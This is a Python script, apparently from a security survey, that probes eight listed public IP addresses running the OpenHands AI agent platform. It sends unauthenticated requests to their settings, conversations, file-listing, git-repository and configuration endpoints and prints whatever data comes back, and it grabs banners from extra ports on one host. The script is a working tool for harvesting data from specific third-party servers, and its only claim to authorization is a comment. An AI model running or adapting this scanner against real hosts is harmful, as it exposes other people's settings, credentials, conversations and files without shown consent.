#!/usr/bin/env python3
"""
OpenHands deep-dive probe — 2026-05-28
8 selected hosts from cat09-2026-05-26 survey
Authorized security research — NuClide Research
"""

import asyncio
import aiohttp
import json
import sys

TIMEOUT = aiohttp.ClientTimeout(total=12)

TARGETS = [
    # (ip, port, label)
    ("143.89.224.22",  3000, "HKUST-HK"),
    ("167.86.87.240",  3000, "Contabo-DE-gemini"),
    ("173.212.227.104",3000, "Contabo-DE-codex"),
    ("200.73.112.39",  3000, "PowerHost-CL-claude"),
    ("40.160.235.43",  3001, "OVH-US-FluidAttacks"),
    ("178.104.254.115",3001, "EE-GB-CRM-stack"),
    ("65.109.88.180",  3000, "Hetzner-FI-gameserver"),
    ("43.129.197.165", 3001, "Tencent-HK-aggregator"),
]

EXTRA_PORTS = {
    "40.160.235.43": [8000, 8080],
}

async def probe(session, ip, port, label):
    base = f"http://{ip}:{port}"
    r = {"host": ip, "port": port, "label": label}

    # /api/v1/settings
    try:
        async with session.get(f"{base}/api/v1/settings", allow_redirects=False) as resp:
            r["settings_status"] = resp.status
            if resp.status == 200:
                try:
                    body = await resp.json(content_type=None)
                    r["settings"] = body
                except Exception:
                    r["settings_raw"] = (await resp.text())[:500]
    except Exception as e:
        r["settings_err"] = str(e)[:80]

    # /api/v1/conversations
    try:
        async with session.get(f"{base}/api/v1/conversations", allow_redirects=False) as resp:
            r["conversations_status"] = resp.status
            if resp.status == 200:
                try:
                    body = await resp.json(content_type=None)
                    if isinstance(body, list):
                        r["conversation_count"] = len(body)
                        r["conversations_sample"] = body[:3]
                    elif isinstance(body, dict):
                        r["conversations_body"] = body
                except Exception:
                    r["conversations_raw"] = (await resp.text())[:400]
    except Exception as e:
        r["conversations_err"] = str(e)[:80]

    # /api/v1/files?path=/
    try:
        async with session.get(f"{base}/api/v1/files?path=/", allow_redirects=False) as resp:
            r["files_status"] = resp.status
            if resp.status == 200:
                try:
                    body = await resp.json(content_type=None)
                    r["files"] = body
                except Exception:
                    r["files_raw"] = (await resp.text())[:400]
    except Exception as e:
        r["files_err"] = str(e)[:80]

    # /api/v1/git/repos
    try:
        async with session.get(f"{base}/api/v1/git/repos", allow_redirects=False) as resp:
            r["git_status"] = resp.status
            if resp.status == 200:
                try:
                    body = await resp.json(content_type=None)
                    r["git_repos"] = body
                except Exception:
                    r["git_raw"] = (await resp.text())[:400]
    except Exception as e:
        r["git_err"] = str(e)[:80]

    # /api/options/config
    try:
        async with session.get(f"{base}/api/options/config", allow_redirects=False) as resp:
            r["options_config_status"] = resp.status
            if resp.status == 200:
                try:
                    r["options_config"] = await resp.json(content_type=None)
                except Exception:
                    pass
    except Exception as e:
        r["options_config_err"] = str(e)[:80]

    # /api/options/models  (short — just count)
    try:
        async with session.get(f"{base}/api/options/models", allow_redirects=False) as resp:
            r["models_status"] = resp.status
            if resp.status == 200:
                try:
                    body = await resp.json(content_type=None)
                    if isinstance(body, list):
                        r["models_count"] = len(body)
                        r["models_sample"] = body[:5]
                except Exception:
                    pass
    except Exception as e:
        r["models_err"] = str(e)[:80]

    return r


async def probe_extra_port(session, ip, port):
    base = f"http://{ip}:{port}"
    result = {"host": ip, "port": port}
    try:
        async with session.get(f"{base}/", allow_redirects=False) as resp:
            result["status"] = resp.status
            result["headers"] = dict(resp.headers)
            try:
                result["body_snippet"] = (await resp.text())[:400]
            except Exception:
                pass
    except Exception as e:
        result["err"] = str(e)[:100]
    return result


async def main():
    connector = aiohttp.TCPConnector(limit=20, ssl=False)
    async with aiohttp.ClientSession(timeout=TIMEOUT, connector=connector) as session:
        tasks = [probe(session, ip, port, label) for ip, port, label in TARGETS]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        extra_tasks = []
        for ip, ports in EXTRA_PORTS.items():
            for port in ports:
                extra_tasks.append(probe_extra_port(session, ip, port))
        extra_results = await asyncio.gather(*extra_tasks, return_exceptions=True)

    output = {
        "main_probes": [r if not isinstance(r, Exception) else {"error": str(r)} for r in results],
        "extra_port_probes": [r if not isinstance(r, Exception) else {"error": str(r)} for r in extra_results],
    }

    print(json.dumps(output, indent=2, default=str))


if __name__ == "__main__":
    asyncio.run(main())
